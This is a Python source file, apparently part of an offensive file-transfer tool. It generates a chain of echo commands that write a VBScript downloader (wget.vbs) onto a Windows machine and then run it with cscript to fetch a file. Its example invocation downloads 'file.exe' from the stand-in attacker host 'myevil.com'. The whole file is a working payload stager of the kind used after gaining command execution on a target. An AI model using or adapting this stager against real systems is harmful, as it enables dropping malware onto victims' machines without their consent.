from filesender.copy_script.Scripter import Scripter

class VBScript(Scripter):
    cmd = [
        'echo strUrl = WScript.Arguments.Item(0) > <WGET_FILE>',
        'echo StrFile = WScript.Arguments.Item(1) >> <WGET_FILE>',
        'echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> <WGET_FILE>',
        'echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> <WGET_FILE>',
        'echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> <WGET_FILE>',
        'echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> <WGET_FILE>',
        'echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> <WGET_FILE>',
        'echo Err.Clear >> <WGET_FILE>',
        'echo Set http = Nothing >> <WGET_FILE>',
        'echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> <WGET_FILE>',
        'echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> <WGET_FILE>',
        'echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> <WGET_FILE>',
        'echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> <WGET_FILE>',
        'echo http.Open "GET", strURL, False >> <WGET_FILE>',
        'echo http.Send >> <WGET_FILE>',
        'echo varByteArray = http.ResponseBody >> <WGET_FILE>',
        'echo Set http = Nothing >> <WGET_FILE>',
        'echo Set fs = CreateObject("Scripting.FileSystemObject") >> <WGET_FILE>',
        'echo Set ts = fs.CreateTextFile(StrFile, True) >> <WGET_FILE>',
        'echo strData = "" >> <WGET_FILE>',
        'echo strBuffer = "" >> <WGET_FILE>',
        'echo For lngCounter = 0 to UBound(varByteArray) >> <WGET_FILE>',
        'echo ts.Write Chr(255 And Ascb(Midb(varByteArray, lngCounter + 1, 1))) >> <WGET_FILE>',
        'echo Next >> <WGET_FILE>',
        'echo ts.Close >> <WGET_FILE>',
        'cscript <WGET_FILE> <URL> <TARGET_FILE>'
    ]

    def replace_personnal_tag(self, cmd):
        return cmd.replace("<WGET_FILE>", self.create_path_to_file(self.destination_directory, "wget.vbs"))


if __name__ == "__main__":
    script = VBScript(file_name="file.exe", destination_directory="C:\\\\test\\", url="myevil.com")
    print script.get_one_line_script()
